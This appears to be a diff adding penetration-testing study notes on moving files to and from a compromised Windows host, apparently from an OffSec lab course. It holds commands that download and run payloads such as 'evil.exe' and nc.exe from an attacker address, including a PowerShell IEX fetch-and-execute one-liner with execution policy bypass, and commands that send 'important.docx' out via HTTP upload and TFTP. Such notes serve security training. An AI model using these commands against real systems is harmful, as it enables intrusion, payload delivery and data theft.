@@ -1,0 +1,67 @@
+File Transfer:-
+
+
+	Installing and Setup Pure-FTPd in Kali machine:-
+	sudo apt update && sudo apt install pure-ftpd
+	sudo ./setup-ftp.sh
+	
+	Transferring Files with Windows Hosts:
+	sudo systemctl restart pure-ftpd
+	C:\Users\offsec>echo open 10.11.0.4 21> ftp.txt
+	C:\Users\offsec>echo USER offsec>> ftp.txt
+	C:\Users\offsec>echo lab>> ftp.txt
+	C:\Users\offsec>echo bin >> ftp.txt
+	C:\Users\offsec>echo GET nc.exe >> ftp.txt
+	C:\Users\offsec>echo bye >> ftp.txt
+	
+	C:\Users\offsec> ftp -v -n -s:ftp.txt
+	
+	ftp> bin
+	ftp> GET nc.exe
+	ftp> bye
+	C:\Users\offsec> nc.exe -h
+	
+	
+
+Windows Downloads Using Scripting Languages:-
+	cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
+	
+PowerShell as an even simpler download:-
+	C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+	C:\Users\Offsec> echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
+	C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
+	C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1
+	C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+	C:\Users\Offsec> powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+	powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
+	
+Windows Downloads with exe2hex and PowerShell:-
+	upx -9 nc.exe  #it will shirnk the size
+	exe2hex -x nc.exe -p nc.cmd
+	When we copy and paste this script (nc.cmd) into a shell on our Windows machine and run it, we can see that it does, in fact, create a perfectly-working copy of our original nc.exe.
+	
+	
+	
+Windows Uploads Using Windows Scripting Languages:-
+###Save it as upload.pho in /var/www/html and start apcahe server 
+<?php
+$uploaddir = '/var/www/uploads/';
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+mkdir /var/www/uploads
+chown www-data: /var/www/uploads
+powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
+
+
+
+Uploading Files with TFTP:-
+
+	kali@kali:~$ sudo apt update && sudo apt install atftp
+	kali@kali:~$ sudo mkdir /tftp
+	kali@kali:~$ sudo chown nobody: /tftp
+	kali@kali:~$ sudo atftpd --daemon --port 69 /tftp
+	
+	C:\Users\Offsec> tftp -i 10.11.0.4 put important.docx
+	
+
